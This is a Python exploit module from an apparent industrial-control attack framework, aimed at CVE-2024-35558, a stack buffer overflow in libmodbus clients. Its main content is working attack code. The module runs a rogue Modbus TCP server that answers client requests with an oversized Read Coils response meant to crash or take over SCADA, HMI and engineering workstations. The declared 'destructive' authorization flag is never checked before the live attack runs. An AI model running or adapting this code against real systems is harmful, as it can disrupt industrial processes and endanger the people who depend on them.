"""IXF ICS CVE Module — CVE-2024-35558 (libmodbus < 3.1.10 Stack Overflow).

Stack-based buffer overflow in libmodbus library versions prior to 3.1.10.
A malformed Modbus TCP response triggers the overflow in the Modbus client,
affecting any embedded device or ICS application using libmodbus for communication.

CVSS: 9.8 (CRITICAL)
CWE: CWE-121
Port: 502 (Modbus TCP)
"""
import socket
import struct

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "CVE-2024-35558 — libmodbus Stack Buffer Overflow",
        "description":      "Stack overflow in libmodbus < 3.1.10 triggered by a malformed Modbus TCP response. Affects embedded devices, SCADA systems, and PLCs using libmodbus for client communication.",
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://nvd.nist.gov/vuln/detail/CVE-2024-35558",
            "https://github.com/stephane/libmodbus",
        ),
        "devices":          (
            "Any embedded device using libmodbus < 3.1.10",
            "SCADA/HMI applications using libmodbus",
            "Industrial gateways with Modbus client",
        ),
        "impact":           "CRITICAL",
        "exploit_type":     "Stack Buffer Overflow — Client-side RCE",
        "cve":              "CVE-2024-35558",
        "cvss":             "9.8",
        "severity":         "CRITICAL",
        "mitre_techniques": ['T0866', 'T0822'],
        "mitre_tactics":    ['Initial Access', 'Execution'],
        "note":             "Client-side vulnerability: attacker controls a Modbus server and serves malformed responses to the vulnerable client.",
    }

    target      = OptIP("", "Target IP (client connecting to this Modbus server)")
    port        = OptPort(502, "Modbus TCP port (default 502)")
    simulate    = OptBool(False, "Simulate — describe exploit without starting listener")
    destructive = OptBool(False, "Enable live exploitation — requires authorization")

    @mute
    def check(self):
        if not self.target:
            return False
        # This is a server-side module — check if target has libmodbus-based client
        # by scanning for Modbus TCP client connections
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self):
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2024-35558 — libmodbus Stack Buffer Overflow\n"
                    "CVSS 9.8 (CRITICAL) | CWE-121 Stack Overflow\n\n"
                    "Attack Model (client-side vulnerability):\n"
                    "  - Attacker controls a Modbus TCP server (or MITM position)\n"
                    "  - Vulnerable client connects using libmodbus < 3.1.10\n\n"
                    "Step 1: Listen on TCP 502 (rogue Modbus server)\n"
                    "Step 2: Accept connection from libmodbus client\n"
                    "Step 3: Respond to any Modbus request with malformed response:\n"
                    "       - Function code 0x01 (Read Coils)\n"
                    "       - Byte count field: 0xFF (255 bytes reported)\n"
                    "       - Actual data: 1024 bytes (>> stack buffer)\n"
                    "Step 4: libmodbus copies response without bounds check\n"
                    "Step 5: Stack overflow -> return address overwrite -> RCE\n"
                    "       on the Modbus client (engineering workstation, SCADA, HMI)"
                ),
                mitre_techniques=["T0866", "T0822"],
            )
            print_info("Note: This is a client-side exploit. Run rogue server or use MITM position.")
            print_info("Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-35558")
            return

        print_status("[CVE-2024-35558] Starting rogue Modbus server on port {} ...".format(self.port))
        print_status("[CVE-2024-35558] Waiting for vulnerable libmodbus client to connect ...")

        import time

        # Malformed Modbus response: claim 255 coils but provide 1024 bytes
        # MBAP header: trans_id(2) + proto_id(2) + length(2) + unit_id(1)
        # PDU: func_code(1) + byte_count(1) + data(N)
        def make_overflow_response(trans_id: int) -> bytes:
            func_code  = b"\x01"      # Read Coils response
            byte_count = b"\xFF"      # Claimed: 255 bytes (triggers libmodbus alloc)
            data       = b"\xCC" * 1024  # Actual: 1024 bytes (stack smash)
            pdu        = func_code + byte_count + data
            mbap       = struct.pack(">HHHB", trans_id, 0, len(pdu) + 1, 1)
            return mbap + pdu

        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((self.target if self.target != "0.0.0.0" else "", self.port))
        except OSError:
            srv.bind(("", self.port))
        srv.listen(1)
        srv.settimeout(30)

        try:
            conn, addr = srv.accept()
            print_success("[CVE-2024-35558] Client connected from {}".format(addr))
            data = conn.recv(256)
            if len(data) >= 6:
                trans_id = struct.unpack_from(">H", data, 0)[0]
                overflow_resp = make_overflow_response(trans_id)
                print_status("[CVE-2024-35558] Sending malformed response ({} bytes) ...".format(len(overflow_resp)))
                conn.sendall(overflow_resp)
                time.sleep(0.5)
                try:
                    client_resp = conn.recv(32)
                    if not client_resp:
                        print_success("[CVE-2024-35558] Client disconnected after overflow — crash/RCE likely triggered!")
                    else:
                        print_info("[CVE-2024-35558] Client still alive: {}".format(client_resp.hex()[:32]))
                except Exception:
                    print_success("[CVE-2024-35558] Client connection lost after overflow — exploitation indicator")
            conn.close()
        except socket.timeout:
            print_warning("[CVE-2024-35558] No client connected within 30s — ensure target uses libmodbus < 3.1.10 as client")
        except Exception as exc:
            print_error("[CVE-2024-35558] Error: {}".format(exc))
        finally:
            srv.close()
